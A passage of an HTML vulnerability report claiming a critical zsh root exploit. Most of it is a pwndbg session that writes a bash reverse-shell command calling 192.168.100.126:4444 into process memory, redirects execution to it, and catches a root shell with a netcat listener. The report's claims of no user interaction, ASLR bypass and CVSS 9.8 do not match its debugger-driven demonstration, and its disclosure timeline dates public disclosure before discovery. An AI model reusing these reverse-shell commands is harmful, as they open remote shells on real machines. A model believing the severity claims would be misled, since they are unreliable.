+pwndbg> set {char[120]} 0x555555659000 = {'b','a','s','h',' ','-','c',' ','\'','b','a','s','h',' ','-','i',' ','>','&',' ','/','d','e','v','/','t','c','p','/','1','9','2','.','1','6','8','.','1','0','0','.','1','2','6','/','4','4','4','4',' ','0','>','&','1','\'',0}
+pwndbg> x/s 0x555555659000 
+0x555555659000: "bash -c 'bash -i >& /dev/tcp/192.168.100.126/4444 0>&1'"
+pwndbg> set {long}0x7fffffffd868 = 0x7ffff7cc9110 
+pwndbg> set $rdi = 0x555555659000
+pwndbg> set $rsp = $rsp - 8
+pwndbg> continue</mark>
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555a1331 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────
+ RAX  0x964619c7
+ RBX  0x964619c7
+ RCX  0x555555666f20 ◂— 0
+ RDX  0x964619c7
+ RDI  0x555555659000 ◂— "bash -c 'bash -i >& /dev/tcp/192.168.100.126/4444 0>&1'"
+ RSI  0x2c8c338e
+ R8   0x555555657af0 ◂— 0x555000010000
+ R9   1
+ R10  0
+ R11  0xffffffff
+ R12  0x555555666f20 ◂— 0
+ R13  1
+ R14  0x964619c7
+ R15  0x7ffff7fbbef8 ◂— 0x21 /* '!' */
+ RBP  0
+*RSP  0x7fffffffde88 ◂— 0
+*RIP  0x5555555a1331 ◂— movsx r9, word ptr [r8 + rsi*2]
+──────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────
+ ► 0x5555555a1331    movsx  r9, word ptr [r8 + rsi*2]          <Cannot dereference [0x5555ae7de20c]>
+   0x5555555a1336    lea    esi, [rdx + rdx]
+   0x5555555a1339    movsxd rsi, esi
+   0x5555555a133c    movsx  esi, word ptr [r8 + rsi*2 + 2]
+   0x5555555a1342    xor    r8d, r8d                           R8D => 0
+   0x5555555a1345    test   eax, eax
+   0x5555555a1347    mov    rdi, r9
+   0x5555555a134a    cmovs  eax, r8d
+   0x5555555a134e    cmp    r9d, eax
+   0x5555555a1351    jl     0x5555555a1388              <0x5555555a1388>
+ 
+   0x5555555a1353    xor    eax, eax     EAX => 0
+───────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffde88 ◂— 0
+01:0008│     0x7fffffffde90 ◂— 0x964619c7
+02:0010│     0x7fffffffde98 —▸ 0x5555555a379b ◂— test rax, rax
+03:0018│     0x7fffffffdea0 —▸ 0x555555639fc0 (typtab) ◂— 0x200020002001220
+04:0020│     0x7fffffffdea8 —▸ 0x555555639fc0 (typtab) ◂— 0x200020002001220
+05:0028│     0x7fffffffdeb0 ◂— 0x55635080
+06:0030│     0x7fffffffdeb8 —▸ 0x555555610214 ◂— 0xfffa7a0cfffa7c56
+07:0038│     0x7fffffffdec0 ◂— 0xffffffff
+─────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5555555a1331 None
+   1       0x964619c7 None
+   2   0x5555555a379b None
+   3   0x5555555a46bf None
+   4   0x5555555b7b06 None
+   5   0x5555555da9ea parse_event+42
+   6   0x5555555a8280 loop+160
+   7   0x5555555ac136 zsh_main+1046
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+<mark>pwndbg> set {long}$rsp = 0x55555555a000 
+pwndbg> set $rip = 0x7ffff7cc9110
+pwndbg> set $rdi = 0x555555659000
+pwndbg> continue 
+Continuing. </mark>
+[Attaching after Thread 0x7ffff7c75300 (LWP 13319) vfork to child process 13325]
+[New inferior 2 (process 13325)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Detaching vfork parent process 13319 after child exec]
+[Inferior 1 (process 13319) detached]
+process 13325 is executing new program: /usr/bin/dash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Attaching after Thread 0x7ffff7da5740 (LWP 13325) vfork to child process 13326]
+[New inferior 3 (process 13326)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Detaching vfork parent process 13325 after child exec]
+[Inferior 2 (process 13325) detached]
+process 13326 is executing new program: /usr/bin/bash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Attaching after Thread 0x7ffff7d6f740 (LWP 13326) fork to child process 13327]
+[New inferior 4 (process 13327)]
+[Detaching after fork from parent process 13326]
+[Inferior 3 (process 13326) detached]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+process 13327 is executing new program: /usr/bin/bash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Attaching after Thread 0x7ffff7d6f740 (LWP 13327) fork to child process 13328]
+[New inferior 5 (process 13328)]
+[Detaching after fork from parent process 13327]
+[Inferior 4 (process 13327) detached]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+process 13328 is executing new program: /usr/bin/tput
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Inferior 5 (process 13328) exited normally]
+pwndbg> 
+ <h4> ----------------Attacker Terminal ----------------------------</h4>
+<mark>livepwn@vuln:~/Documents/Exploit$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.100.126] from (UNKNOWN) [192.168.100.126] 43298
+┌──(root㉿vuln)-[/home/livepwn/Downloads]
+└─# id
+id
+uid=0(root) gid=0(root) groups=0(root) </mark>
+</pre>
+
+  <p><strong>Impact:</strong></p>
+  <ul>
+    <li>By keeping root privileges inside GDB, attacker bypasses normal kernel protections.</li>
+    <li>Attacker can spawn an interactive root shell by manipulating GDB context.</li>
+    <li>This bypasses <code>sudo</code> restrictions and avoids leaving audit logs.</li>
+    <li>Even without a working ROP chain, attacker can hijack <code>$rip</code> or overwrite function return values.</li>
+  </ul>
+
+  <p><strong>Exploit Scenario:</strong> Launch Zsh with sudo or as a setuid binary, inject crashing input (e.g., <code>!!</code>), then modify the GDB session to inject and execute a root shell payload.</p>
+
+  <p><strong>Severity:</strong> <span class="critical">Critical</span>. Privilege retention inside GDB from a setuid binary enables full privilege escalation without kernel-level exploits. It turns Zsh into a local root vector via post-crash manipulation.</p>
+</div>
+
+  <div class="section">
+  <h2>3. Impact Assessment</h2>
+  <p><strong>CVSS Score:</strong> <span class="critical">9.8 (Critical)</span></p>
+  <p><strong>Severity Level:</strong> <span class="critical">Critical</span></p>
+
+  <ul>
+    <li><strong>Attack Vector:</strong> Local</li>
+    <li><strong>Attack Complexity:</strong> Low</li>
+    <li><strong>Privileges Required:</strong> Low</li>
+    <li><strong>User Interaction:</strong> None</li>
+    <li><strong>Scope:</strong> Changed (Leads to elevation outside current context)</li>
+    <li><strong>Confidentiality Impact:</strong> High (memory leaks and ASLR bypass)</li>
+    <li><strong>Integrity Impact:</strong> High (possible function pointer overwrite)</li>
+    <li><strong>Availability Impact:</strong> High (segfault and process crash)</li>
+  </ul>
+
+  <p>This vulnerability allows full root shell access, bypasses ASLR, enables arbitrary memory read/write, and is easily reproducible using crafted input to Zsh. Exploitation does not require any special privileges or user interaction, making it a <strong>critical security risk</strong> in any system where <code>zsh</code> is installed setuid or used with <code>sudo</code> sessions.</p>
+</div>
+  <div class="section">
+    <h2>8. Disclosure Timeline</h2>
+    <ul>
+      <li>Discovery Date: [21 June 2025]</li>
+      <li>Vendor Notified: [22 June 2025]</li>
+      <li>Patch Release: TBD</li>
+      <li>Public Disclosure: [19 May 2025]</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>9. References</h2>
+    <ul>
+      <li>Zsh Git Repository</li>
+      <li>MITRE CVE Guidelines</li>
+      <li>ISO 29147 Disclosure Standard</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>Contact</h2>
+    <p>This report follows ISO 29147 and CVE Numbering Authority (CNA) guidelines.<br>
+    For verification and full exploit code (via responsible disclosure): <br>
+    <strong>Email:</strong> <a href="mailto:ranasinanadil@gmail.com">ranasinanadil@gmail.com</a></p>
+  </div>
+</body>
+</html>
